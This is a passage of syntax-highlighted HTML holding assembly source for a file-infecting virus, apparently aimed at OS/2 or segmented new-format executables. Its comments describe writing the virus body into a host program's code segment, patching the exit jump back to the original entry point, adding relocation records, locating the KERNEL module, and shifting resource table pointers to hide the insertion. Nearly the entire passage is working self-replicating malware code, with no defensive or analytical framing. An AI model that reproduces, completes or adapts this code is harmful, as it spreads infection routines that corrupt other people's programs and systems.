        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">DATABUF_SIZE</span><span class="sc0">         </span><span class="sc1">;nope, adjust indicies</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">DATABUF_SIZE</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RR_LP</span><span class="sc0">                   </span><span class="sc1">;and go do another</span><span class="sc0">

</span><span class="sc5">RRE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">VSTART</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ARELOCS</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;now add ARELOCS relocatables to the end</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ARELOCS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;si points to relocatable table</span><span class="sc0">
</span><span class="sc5">RRL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;move relocatables to buffer and adjust</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;add orig code size to the offset here</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">KERNEL</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;put kernel module ref no next</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">RRL</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ARELOCS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;and put them in the file</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;This routine finds the KERNEL module in the module reference table, and puts</span><span class="sc0">
</span><span class="sc1">;it into the virus relocation records.</span><span class="sc0">
</span><span class="sc5">SETUP_KERNEL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">28H</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;go to start of module ref tbl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">NH_OFFSET</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                          </span><span class="sc1">;read up to 32 module ofs's to</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">                       </span><span class="sc1">;the TEMP buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
</span><span class="sc5">SK1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">;get a module offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">NH_OFFSET</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;lookup in imported name tbl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">2AH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">                    </span><span class="sc1">;prep to read module name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">                       </span><span class="sc1">;read it into TEMP at 40H</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">KERNEL</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;assume this is KERNEL</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;last entry?</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">SK2</span><span class="sc0">                       </span><span class="sc1">;yes, use it by default</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">KNAME</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;check it</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">SK3</span><span class="sc0">                       </span><span class="sc1">;wasn't it, continue</span><span class="sc0">
</span><span class="sc5">SK2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                              </span><span class="sc1">;else exit with KERNEL set as is</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SK3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SK1</span><span class="sc0">


</span><span class="sc1">;This routine writes the virus code itself into the code segment being infected.</span><span class="sc0">
</span><span class="sc1">;It also updates the jump which exits the virus so that it points to the old</span><span class="sc0">
</span><span class="sc1">;entry point in this segment.</span><span class="sc0">
</span><span class="sc5">WRITE_VIRUS_CODE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">INITSEC</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;sectors to code segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">LOG_SEC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;dx:ax = location of code seg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;dx:ax = place to put virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;save these to adjust jump</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;seek there</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">          </span><span class="sc1">;move virus code to data segment now</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">VSTART</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WVCL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">WVCL</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">VSTART</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;now set relocatable areas in code to</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ARELOCS</span><span class="sc0">       </span><span class="sc1">;FFFF 0000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">WVC2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">WVC2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">           </span><span class="sc1">;cx=size of virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">          </span><span class="sc1">;dx=offset of start of virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;write virus to file now</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;ok, now we have to update the jump</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;to the host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_DONE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;cx:dx=location to update</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">            </span><span class="sc1">;go there</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;ax=offset of instr after jump</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">ENTRYPT</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;ax=distance to jump</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;make it a negative number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;save it here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;and write it to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">              </span><span class="sc1">;all done</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Update the resource table so sector pointers are right, if there are</span><span class="sc0">
</span><span class="sc1">;any resources</span><span class="sc0">
</span><span class="sc5">UPDATE_RES_TABLE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">34H</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;any resources?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">URTE</span><span class="sc0">                            </span><span class="sc1">;nope, quit this part</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NEW_HDR</span><span class="sc4">+</span><span class="sc2">24H</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;move to resource table in EXE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">NH_OFFSET</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK_ST</span><span class="sc0">
</span><span class="sc5">URT1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">               </span><span class="sc1">;read 8 byte typeinfo record</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;is type ID 0?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">URTE</span><span class="sc0">              </span><span class="sc1">;yes, all done</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get count of nameinfo records to read</span><span class="sc0">

</span><span class="sc5">URT2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">               </span><span class="sc1">;read 1 nameinfo record</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get offset of resource</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">INITSEC</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;greater than initial cs location?</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">URT3</span><span class="sc0">              </span><span class="sc1">;nope, don't worry about it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">VIRSECS</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;add size of virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TEMP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;now back file pointer up</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_SEEK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TEMP</span><span class="sc0">          </span><span class="sc1">;and write updated resource rec to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                   </span><span class="sc1">;the file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FILE_WRITE</span><span class="sc0">

</span><span class="sc5">URT3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;read until all nameinfo records for</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">URT2</span><span class="sc0">                    </span><span class="sc1">;this typeinfo are done</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">URT1</span><span class="sc0">                    </span><span class="sc1">;go get another typeinfo record</span><span class="sc0">

</span><span class="sc5">URTE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Calls to DOSCALL-based file i/o functions go here.</span><span class="sc0">

</span><span class="sc1">;Open the file specified at ds:dx in read/write mode.</span><span class="sc0">
</span><span class="sc5">FILE_OPEN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;push pointer to file name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;push pointer to handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;push pointer to OpenAction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OPENACTION</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;initial file allocation DWORD</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;push attributes (hidden, r/o, normal</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;FILE_OPEN</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">42</span><span class="sc0">                      </span><span class="sc1">;OPEN_SHARE_DENYNONE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;DWORD 0 (reserved)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
